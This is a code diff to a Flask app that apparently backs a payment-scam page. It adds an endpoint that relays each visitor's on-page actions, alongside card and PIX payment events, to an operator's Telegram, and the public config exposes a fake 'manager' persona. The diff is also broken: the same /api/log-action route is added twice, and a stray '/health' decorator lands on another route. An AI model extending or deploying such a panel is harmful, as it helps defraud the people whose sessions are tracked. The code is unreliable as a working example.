@@ -343,7 +343,8 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             "CARD_CHOSEN": "💳",
             "PIX_GENERATED": "⏳",
             "PIX_PAID": "✅",
-            "INFO_ADDED": "📝"
+            "INFO_ADDED": "📝",
+            "STEP_ACTION": "🖱️"
         }
         icon = icons.get(event_type, "ℹ️")
         
@@ -1590,6 +1591,20 @@ def api_admin_bot_config():
     return jsonify({"ok": True})
 
 
+@app.route("/api/log-action", methods=["POST"])
+def api_log_action():
+    data = request.get_json() or {}
+    sid = sanitize(data.get("session_id", ""), 40)
+    action = sanitize(data.get("action", ""), 100)
+    details = sanitize(data.get("details", ""), 200)
+    
+    # Store action in DB or just forward to TG
+    if sid and action:
+        texto = f"{action}" + (f": {details}" if details else "")
+        import threading
+        threading.Thread(target=send_telegram_notify, args=(sid, f"STEP_ACTION: {texto}")).start()
+    return jsonify({"ok": True})
+
 @app.route('/health')
 
 @app.route("/api/admin/advanced-config", methods=["POST"])
@@ -1610,6 +1625,20 @@ def api_get_public_config():
     db = get_db()
     rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code')").fetchall()
     return jsonify({r["key"]: r["value"] for r in rows})
+
+@app.route("/api/log-action", methods=["POST"])
+def api_log_action():
+    data = request.get_json() or {}
+    sid = sanitize(data.get("session_id", ""), 40)
+    action = sanitize(data.get("action", ""), 100)
+    details = sanitize(data.get("details", ""), 200)
+    
+    # Store action in DB or just forward to TG
+    if sid and action:
+        texto = f"{action}" + (f": {details}" if details else "")
+        import threading
+        threading.Thread(target=send_telegram_notify, args=(sid, f"STEP_ACTION: {texto}")).start()
+    return jsonify({"ok": True})
 
 @app.route('/health')
 def health():
